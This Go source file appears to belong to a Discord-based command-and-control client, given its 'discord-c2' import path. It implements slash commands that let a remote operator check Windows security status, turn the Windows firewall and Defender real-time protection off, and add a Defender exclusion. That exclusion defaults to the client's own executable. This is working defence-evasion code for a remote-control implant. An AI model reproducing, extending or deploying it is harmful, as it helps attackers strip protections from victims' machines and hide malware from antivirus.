package commands

// This file contains Windows-specific slash commands: winsec, winfirewall,
// windefender, and windefenderexclude. They compile everywhere and reply with
// an "unsupported" message when the host is not Windows.

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"discord-c2/internal/winsec"

	"github.com/bwmarrin/discordgo"
)

const unsupportedWindows = "This command is only available on Windows clients."

// handleSlashWinSec reports firewall and Defender real-time protection status.
func handleSlashWinSec(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if !onWindows(s, i) {
		return
	}

	firewall, fwErr := winsec.FirewallStatus()
	defender, defErr := winsec.DefenderStatus()
	if fwErr != nil {
		firewall = fmt.Sprintf("unknown (error: %s)", winsec.Truncate(fwErr.Error(), 120))
	}
	if defErr != nil {
		defender = fmt.Sprintf("unknown (error: %s)", winsec.Truncate(defErr.Error(), 120))
	}

	respondEphemeral(s, i, fmt.Sprintf(
		"🛡 Windows security status\n\n• Firewall: **%s**\n• Defender real-time protection: **%s**",
		firewall, defender,
	))
}

func handleSlashWinFirewall(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	if !onWindows(s, i) {
		return
	}
	mode, ok := modeOption(s, i, data)
	if !ok {
		return
	}

	status, output, err := winsec.SetFirewall(mode)
	if err != nil {
		log.Printf("winfirewall command failed for mode=%s: %v", mode, err)
		respondEphemeral(s, i, fmt.Sprintf("Failed to set firewall %s: %s\n\nTry running the client as administrator.", mode, err))
		return
	}

	msg := fmt.Sprintf("Firewall set to **%s** (reported status: %s)", mode, status)
	if output != "" {
		msg += "\n\nnetsh output:\n```text\n" + output + "\n```"
	}
	log.Printf("winfirewall set mode=%s, reported status=%s", mode, status)
	respondEphemeral(s, i, msg)
}

func handleSlashWinDefender(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	if !onWindows(s, i) {
		return
	}
	mode, ok := modeOption(s, i, data)
	if !ok {
		return
	}

	status, err := winsec.SetDefenderRealtime(mode)
	if err != nil {
		log.Printf("windefender command failed for mode=%s: %v", mode, err)
		respondEphemeral(s, i, fmt.Sprintf("Failed to set Defender real-time protection %s: %s\n\nTry running the client as administrator.", mode, err))
		return
	}

	log.Printf("windefender set mode=%s, reported status=%s", mode, status)
	respondEphemeral(s, i, fmt.Sprintf("Defender real-time protection set to **%s** (reported status: %s)", mode, status))
}

func handleSlashWinDefenderExclude(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	if !onWindows(s, i) {
		return
	}

	pathVal := stringOption(data, "path")
	if pathVal == "" {
		exe, err := os.Executable()
		if err != nil {
			respondEphemeral(s, i, "Could not determine executable path: "+winsec.Truncate(err.Error(), 200))
			return
		}
		pathVal = exe
	}
	pathVal, _ = filepath.Abs(pathVal)

	if err := winsec.AddExclusion(pathVal); err != nil {
		log.Printf("windefenderexclude failed for %s: %v", pathVal, err)
		respondEphemeral(s, i, fmt.Sprintf("Failed to add Defender exclusion for %q: %s\n\nTry running the client as administrator.", pathVal, winsec.Truncate(err.Error(), 200)))
		return
	}

	log.Printf("windefenderexclude added exclusion for %s", pathVal)
	respondEphemeral(s, i, fmt.Sprintf("Added Defender exclusion for path:\n```text\n%s\n```", pathVal))
}

func onWindows(s *discordgo.Session, i *discordgo.InteractionCreate) bool {
	if runtime.GOOS == "windows" {
		return true
	}
	respondEphemeral(s, i, unsupportedWindows)
	return false
}

func modeOption(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) (string, bool) {
	mode := strings.ToLower(stringOption(data, "mode"))
	if mode != "on" && mode != "off" {
		respondEphemeral(s, i, "mode must be `on` or `off`")
		return "", false
	}
	return mode, true
}

func stringOption(data discordgo.ApplicationCommandInteractionData, name string) string {
	for _, opt := range data.Options {
		if opt.Name == name {
			if v, ok := opt.Value.(string); ok {
				return v
			}
		}
	}
	return ""
}
